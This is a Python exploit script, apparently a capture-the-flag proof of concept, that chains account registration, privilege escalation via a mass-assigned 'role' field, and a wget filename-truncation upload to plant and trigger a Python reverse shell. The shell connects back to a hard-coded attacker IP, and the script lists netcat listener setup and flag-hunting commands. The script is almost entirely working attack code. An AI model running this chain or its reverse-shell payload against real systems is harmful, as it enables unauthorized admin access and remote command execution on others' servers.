#!/usr/bin/env python3
import requests
import sys
import time
import os

# Target Configuration
TARGET_URL = "http://84.247.129.120:45001"
ATTACKER_IP = "20.79.55.16"
ATTACKER_PORT = 8888
ATTACKER_SERVER = f"{ATTACKER_IP}:8000"

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Color codes
class c:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    banner = f"""
{c.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                          Role-Play CTF - Exploit PoC                         ║
║                   Mass Assignment + wget Truncation RCE                      ║
╚══════════════════════════════════════════════════════════════════════════════╝{c.END}

{c.BOLD}Target:{c.END}     {TARGET_URL}
{c.BOLD}Attacker:{c.END}   {ATTACKER_IP}:{ATTACKER_PORT}
{c.BOLD}Server:{c.END}     {ATTACKER_SERVER}

"""
    print(banner)

def print_step(step_num, title):
    print(f"\n{c.HEADER}{'═'*80}")
    print(f"  [{step_num}] {title}")
    print(f"{'═'*80}{c.END}\n")

def log_info(msg):
    print(f"{c.BLUE}[*]{c.END} {msg}")

def log_success(msg):
    print(f"{c.GREEN}[+]{c.END} {msg}")

def log_error(msg):
    print(f"{c.RED}[-]{c.END} {msg}")

def log_warning(msg):
    print(f"{c.YELLOW}[!]{c.END} {msg}")

def prompt(msg):
    return input(f"{c.CYAN}[?]{c.END} {msg}")

class Exploit:
    def __init__(self):
        self.target = TARGET_URL
        self.attacker_ip = ATTACKER_IP
        self.attacker_port = ATTACKER_PORT
        self.token = None
        self.username = None
        self.session = requests.Session()
        
    def step1_register(self):
        """Register new account"""
        print_step(1, "Account Registration")
        
        # Generate credentials
        import random
        import string
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
        self.username = f"pwn_{rand}"
        email = f"{self.username}@exploit.local"
        password = "Exploit123!"
        
        log_info(f"Registering user: {self.username}")
        
        data = {
            "username": self.username,
            "email": email,
            "password": password,
            "full_name": "Exploit User",
            "bio": ""
        }
        
        try:
            r = self.session.post(f"{self.target}/api/register", json=data, timeout=10)
            
            # Accept both 200 and 201 as success
            if r.status_code in [200, 201]:
                resp = r.json()
                self.token = resp.get('token')
                
                if not self.token:
                    log_error("No token in response")
                    return False
                
                log_success(f"Account created: {self.username}")
                log_success(f"Token: {self.token[:50]}...")
                
                self.session.headers.update({'Authorization': f'Bearer {self.token}'})
                return True
            else:
                log_error(f"Registration failed: {r.status_code}")
                log_error(f"Response: {r.text}")
                return False
                
        except Exception as e:
            log_error(f"Exception: {e}")
            return False
    
    def step2_escalate(self):
        """Exploit mass assignment for admin access"""
        print_step(2, "Privilege Escalation via Mass Assignment")
        
        log_info("Sending malicious payload: {\"role\": \"admin\"}")
        
        try:
            r = self.session.put(
                f"{self.target}/api/profile",
                json={"role": "admin"},
                timeout=10
            )
            
            if r.status_code == 200:
                user_role = r.json().get('user', {}).get('role')
                if user_role == 'admin':
                    log_success("Privilege escalation successful!")
                    log_success(f"User '{self.username}' is now admin")
                    return True
                else:
                    log_error(f"Role not set to admin: {user_role}")
                    return False
            else:
                log_error(f"Profile update failed: {r.status_code}")
                log_error(f"Response: {r.text}")
                return False
            
        except Exception as e:
            log_error(f"Exception: {e}")
            return False
    
    def step3_payload(self):
        """Generate reverse shell payload"""
        print_step(3, "Payload Generation & Setup")
        
        log_info("Calculating wget filename truncation...")
        
        # wget truncates to 236 chars
        PADDING_LEN = 230
        FILENAME = "she.py"
        EXTENSION = ".gif"
        
        padding = "A" * PADDING_LEN
        self.payload_file = f"{padding}{FILENAME}{EXTENSION}"
        self.truncated = f"{padding}{FILENAME}"
        
        log_info(f"Full filename: {len(self.payload_file)} chars")
        log_info(f"After truncation: 236 chars (removes .gif)")
        
        # Reverse shell code
        payload_code = f'''#!/usr/bin/env python3
print("Content-Type: text/plain\\n")
print("Reverse shell connecting to {self.attacker_ip}:{self.attacker_port}...")

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.attacker_ip}",{self.attacker_port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
'''
        
        # Save payload
        with open(self.payload_file, 'w') as f:
            f.write(payload_code)
        
        log_success(f"Payload saved: {self.payload_file[:50]}...")
        
        print()
        log_warning("═" * 60)
        log_warning("SETUP REQUIRED:")
        log_warning("")
        log_warning(f"  Terminal 1: python3 -m http.server 8000")
        log_warning(f"  Terminal 2: nc -lvnp {self.attacker_port}")
        log_warning("")
        log_warning("═" * 60)
        print()
        
        return True
    
    def step4_upload(self):
        """Upload payload via wget vulnerability"""
        print_step(4, "Payload Upload via wget Truncation")
        
        payload_url = f"http://{ATTACKER_SERVER}/{self.payload_file}"
        
        log_info(f"Upload URL: {payload_url[:70]}...")
        log_info("Sending to admin upload endpoint...")
        
        try:
            r = self.session.post(
                f"{self.target}/api/admin/upload",
                json={"url": payload_url},
                timeout=30
            )
            
            if r.status_code == 200:
                resp = r.json()
                output = resp.get('output', '')
                
                if 'reducing to 236' in output:
                    log_success("wget truncation detected!")
                
                if 'saved' in output.lower():
                    log_success("Payload uploaded successfully!")
                    log_success(f"Saved as: {self.truncated[:50]}...")
                
                if output:
                    print(f"\n{c.CYAN}wget output:{c.END}")
                    for line in output.split('\n')[:10]:
                        if line.strip():
                            print(f"  {line}")
                
                return True
            else:
                log_error(f"Upload failed: {r.status_code}")
                log_error(f"Response: {r.text}")
                return False
                
        except Exception as e:
            log_error(f"Exception: {e}")
            return False
    
    def step5_trigger(self):
        """Trigger reverse shell"""
        print_step(5, "Trigger Reverse Shell")
        
        shell_url = f"{self.target}/uploads/{self.truncated}"
        
        log_warning("Ensure your netcat listener is ready!")
        log_info(f"Accessing: {shell_url[:70]}...")
        
        try:
            r = self.session.get(shell_url, timeout=5)
            log_info(f"Response: {r.text[:100]}")
        except requests.exceptions.Timeout:
            log_success("Request timed out (expected)")
            log_success("Reverse shell should be connecting!")
        except Exception as e:
            log_warning(f"Exception: {e}")
            log_info("Check your listener - shell may have connected!")
        
        return True
    
    def run(self):
        """Execute full exploit chain"""
        print_banner()
        
        prompt("Press ENTER to start exploit...")
        
        # Step 1: Register
        if not self.step1_register():
            log_error("Exploit failed at Step 1")
            return False
        
        prompt("\nPress ENTER to continue to Step 2...")
        
        # Step 2: Privilege escalation
        if not self.step2_escalate():
            log_error("Exploit failed at Step 2")
            return False
        
        prompt("\nPress ENTER to continue to Step 3...")
        
        # Step 3: Generate payload
        if not self.step3_payload():
            log_error("Exploit failed at Step 3")
            return False
        
        prompt("Press ENTER when servers are ready...")
        
        # Step 4: Upload
        if not self.step4_upload():
            log_error("Exploit failed at Step 4")
            return False
        
        prompt("\nPress ENTER to trigger shell...")
        
        # Step 5: Trigger
        if not self.step5_trigger():
            log_error("Exploit failed at Step 5")
            return False
        
        # Success
        print()
        print(f"{c.GREEN}{'═'*80}")
        print(f"  EXPLOIT COMPLETED SUCCESSFULLY!")
        print(f"{'═'*80}{c.END}\n")
        
        log_info("Check your netcat listener for incoming shell")
        print()
        log_info("Once connected, try:")
        print(f"  {c.CYAN}${c.END} cat /flag.txt")
        print(f"  {c.CYAN}${c.END} cat /flag")
        print(f"  {c.CYAN}${c.END} find / -name '*flag*' 2>/dev/null")
        print()
        
        return True

def main():
    try:
        exploit = Exploit()
        exploit.run()
    except KeyboardInterrupt:
        print(f"\n\n{c.RED}[!] Exploit interrupted{c.END}\n")
        sys.exit(1)
    except Exception as e:
        print(f"\n{c.RED}[!] Error: {e}{c.END}\n")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()